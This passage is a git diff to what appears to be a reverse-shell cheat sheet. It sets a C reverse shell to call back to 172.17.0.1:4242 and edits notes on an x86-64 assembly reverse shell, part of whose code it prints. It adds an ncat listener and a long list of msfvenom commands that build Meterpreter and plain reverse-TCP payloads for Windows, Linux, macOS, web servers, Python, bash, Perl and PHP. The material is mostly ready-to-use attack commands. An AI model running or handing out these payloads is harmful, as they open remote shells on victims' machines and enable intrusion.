-#define REMOTE_PORT XXX
+#define REMOTE_ADDR "172.17.0.1"
+#define REMOTE_PORT 4242
 
 int main(int argc, char *argv[])
 {
@@ -346,8 +422,12 @@ int main(int argc, char *argv[])
 
 
 # Assembly x86-64
-A reverse shell in assembly for x86-64 architecture. You have to modify `IP address` and `Port` (default 127.0.0.1:1234)
-Then you can compile it with nasm or get shellcode with: [Shellcode-Extractor](https://github.com/Neetx/Shellcode-Extractor)
+# TO REVIEW, ADD HOW TO COMPILE AND HOW/WHERE TO INSERT IP/PORT
+## A reverse shell in assembly for x86-64 architecture. You
+## have to modify `IP address` and `Port` (default 127.0.0.1:1234)
+## Then you can compile it with nasm or get shellcode with:
+## [Shellcode-Extractor](https://github.com/Neetx/Shellcode-Extractor)
+## 04d2 is 1234 in hex
 
 ```asm
 ; 66 byte reverse shell for linux/x86-64
@@ -405,5 +485,33 @@ dup_loop64:
     pop     rdi    
     mov     al, 59           ; rax = sys_execve
     syscall
-
 ```
+
+# Meterpreter Shell
+Listener:
+ncat -nlvp 4242
+
+## Windows Staged reverse TCP 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.17.0.1 LPORT=4242 -f exe > reverse.exe
+
+## Windows Stageless reverse TCP
+msfvenom -p windows/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4242 -f exe > reverse.exe
+
+## Linux Staged reverse TCP
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.17.0.1 LPORT=4242 -f elf >reverse.elf
+
+## Linux Stageless reverse TCP
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4242 -f elf >reverse.elf
+
+## Other platforms
+$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="172.17.0.1" LPORT=4242 -f elf > shell.elf
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="172.17.0.1" LPORT=4242 -f exe > shell.exe
+$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="172.17.0.1" LPORT=4242 -f macho > shell.macho
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="172.17.0.1" LPORT=4242 -f asp > shell.asp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="172.17.0.1" LPORT=4242 -f raw > shell.jsp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="172.17.0.1" LPORT=4242 -f war > shell.war
+$ msfvenom -p python/meterpreter/reverse_tcp LHOST=172.17.0.1 LPORT=4242 -f raw -o /tmp/python.py
+$ msfvenom -p cmd/unix/reverse_python LHOST="172.17.0.1" LPORT=4242 -f raw > shell.py
+$ msfvenom -p cmd/unix/reverse_bash LHOST="172.17.0.1" LPORT=4242 -f raw > shell.sh
+$ msfvenom -p cmd/unix/reverse_perl LHOST="172.17.0.1" LPORT=4242 -f raw > shell.pl
+$ msfvenom -p php/meterpreter_reverse_tcp LHOST="172.17.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
